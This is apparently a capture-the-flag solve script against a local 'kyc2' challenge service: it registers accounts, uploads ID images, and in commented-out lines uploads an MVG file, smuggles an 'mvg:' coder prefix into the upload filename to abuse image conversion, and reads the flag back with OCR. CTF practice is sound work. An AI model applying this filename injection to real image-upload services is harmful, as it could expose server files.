# docker run -v $PWD/ro/:/home/chall/service/ro -v $PWD/rw:/home/chall/service/rw kyc2

import sys
import requests
import cv2
import random
import string
import pytesseract

WORDS = ['a', 'b']
def gen_username():
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(32))

def gen_password():
    return ' '.join(random.choice(WORDS) for _ in range(5))

username = 'test'
password = 'test'

for i in range(0, 50):

    username = gen_username()
    password = gen_password()

    s = requests.Session()
    # Register + Login
    r = s.post('http://127.0.0.1:6666/register', data={'username': username, 'password': password})
    r = s.post('http://127.0.0.1:6666/login', data={'username': username, 'password': password})

    files = {'idcard': open('/tmp/a.png', 'rb')}
    r = s.post('http://127.0.0.1:6666/kyc', files=files)
    #print(r.text)    

# # exploit - Upload MVG
# files = {'idcard': open('idcard.mvg', 'rb')}
# r = s.post('http://127.0.0.1:6666/kyc', files=files)
# print(r.text)    

# # Exploit - Convert
# files = {'idcard': ('./database/mvg:idcard.mvg', '')}
# r = s.post('http://127.0.0.1:6666/kyc', files=files)
# print(r.text)    

# # # Save Flag
# r = s.get('http://127.0.0.1:6666/idcard')
# with open('/tmp/res', 'wb') as f:
#     f.write(r.content)

# img = cv2.imread('/tmp/res.png')

# # Adding custom options
# custom_config = r'--psm 7'
# flag = pytesseract.image_to_string(img) #config=custom_config)
# print(flag)    
